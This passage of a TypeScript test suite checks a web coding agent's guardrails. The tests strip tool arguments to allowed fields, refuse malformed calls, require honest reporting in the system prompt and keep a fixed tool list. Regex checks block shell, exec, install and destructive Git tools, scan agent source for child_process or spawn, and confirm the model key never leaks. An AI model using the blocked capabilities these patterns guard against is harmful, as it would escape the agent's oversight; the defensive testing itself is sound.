    expect(modelCalls[1].user).toMatch(/git_commit .* → refused by the CLI/);
    expect(reserves()).toHaveLength(2);
    expect(settles()).toHaveLength(2);
    resetAgentTasks();
    state.session = goUser;
    modelReplies = [{ tool: "git_push", args: {} }];
    const calls = modelCalls.length;
    expect((await start()).status).toBe(403);
    expect(modelCalls).toHaveLength(calls);
  });
});

describe("a development server and the browser are requests too", () => {
  it("each is passed on with exactly its inputs", async () => {
    const cases: [unknown, unknown][] = [
      [{ tool: "start_process", args: { command: "npm", args: ["run", "dev"], cwd: "web", detached: true, shell: true, env: { A: "b" } } }, { id: "step-1", name: "start_process", args: { command: "npm", args: ["run", "dev"], cwd: "web" } }],
      [{ tool: "process_status", args: { id: "p1", pid: 4242 } }, { id: "step-1", name: "process_status", args: { id: "p1" } }],
      [{ tool: "stop_process", args: { id: "p1", force: true, signal: "SIGKILL" } }, { id: "step-1", name: "stop_process", args: { id: "p1" } }],
      [{ tool: "open_browser", args: { url: "http://localhost:5173/", approved: true, browser: "chrome" } }, { id: "step-1", name: "open_browser", args: { url: "http://localhost:5173/" } }],
    ];
    for (const [reply, expected] of cases) {
      resetAgentTasks();
      modelReplies = [reply];
      const body = await (await start()).json();
      expect(body.turn.call).toEqual(expected);
      expect(JSON.stringify(body)).not.toMatch(/"(safe|approved|risk|autoApprove)"/);
    }
  });

  it("malformed ones are refused, not repaired", async () => {
    for (const reply of [{ tool: "start_process", args: { args: ["run", "dev"] } }, { tool: "start_process", args: { command: "npm", args: "run dev" } }, { tool: "stop_process", args: {} }, { tool: "process_status", args: { id: 1 } }, { tool: "open_browser", args: {} }, { tool: "open_browser", args: { url: "x".repeat(301) } }]) {
      resetAgentTasks();
      modelReplies = [reply];
      expect((await start()).status, JSON.stringify(reply).slice(0, 60)).toBe(502);
    }
  });

  it("the model is told to do the work, to start servers properly, and never to claim what it cannot see", async () => {
    await start();
    const system = modelCalls[0].system;
    expect(system).toMatch(/Do not answer a request for a change with code for the user to paste: make the change with write_file or edit_file/);
    expect(system).toMatch(/run the build \(and the tests, if the project has them\), read any failure, fix what your changes broke, and run it again/);
    expect(system).toMatch(/A development server is started with start_process, never run_command/);
    expect(system).toMatch(/Report the local address exactly as the result gives it; if the result gives none, say so/);
    expect(system).toMatch(/you cannot see it, so never say a page looks right or was verified in the browser/);
    expect(system).toMatch(/If a step was refused, denied by the user, cancelled or failed, say that in the summary/);
  });

  it("a task has room for a real piece of work, and still ends", () => {
    expect(AGENT_SERVER_LIMITS.turns).toBe(60);
  });
});

describe("the service only thinks", () => {
  it("the tool list is fixed: reading, changing files, finishing — nothing that runs a program or changes Git", () => {
    expect([...AGENT_TOOL_NAMES]).toEqual(["list_files", "read_file", "search_files", "git_status", "git_diff", "git_log", "write_file", "edit_file", "delete_path", "run_command", "run_tests", "build", "git_add", "git_commit", "git_branch", "git_checkout", "git_push", "start_process", "stop_process", "process_status", "open_browser", "finish"]);
    // Nothing that is a shell or installs software; and of Git, only these five fixed operations —
    // nothing that forces, resets, cleans, merges, rebases, pulls or deletes.
    expect(AGENT_TOOL_NAMES.filter((name) => /shell|bash|exec|install/.test(name))).toEqual([]);
    // A development server and the browser are their own tools: started, asked about, stopped, opened.
    expect(AGENT_TOOL_NAMES.filter((name) => /process|browser/.test(name))).toEqual(["start_process", "stop_process", "process_status", "open_browser"]);
    expect(AGENT_TOOL_NAMES.filter((name) => name.startsWith("git_") && !["git_status", "git_diff", "git_log"].includes(name))).toEqual(["git_add", "git_commit", "git_branch", "git_checkout", "git_push"]);
    expect(AGENT_TOOL_NAMES.filter((name) => /force|reset|clean|merge|rebase|pull|delete_branch|amend|revert|stash|tag/.test(name))).toEqual([]);
    expect(toolArgs("read_file", { path: "a.ts", startLine: 10, encoding: "base64" })).toEqual({ path: "a.ts", startLine: 10 });
  });

  it("nothing in the agent's code can run a program or touch the file system", async () => {
    const fs = await import("fs");
    const path = await import("path");
    for (const file of ["src/lib/webAgent/agent.ts", "src/lib/webAgent/protocol.ts", "src/app/api/web/agent/turn/route.ts"]) {
      const source = fs.readFileSync(path.join(process.cwd(), file), "utf8");
      expect(source, file).not.toMatch(/child_process|execFile|spawn\(|exec\(|from "fs"|from "node:fs"|require\(/);
    }
  });

  it("the model key is never in a response", async () => {
    const text = JSON.stringify(await (await start()).json());
    expect(text).not.toContain("test-model-key");
  });
});
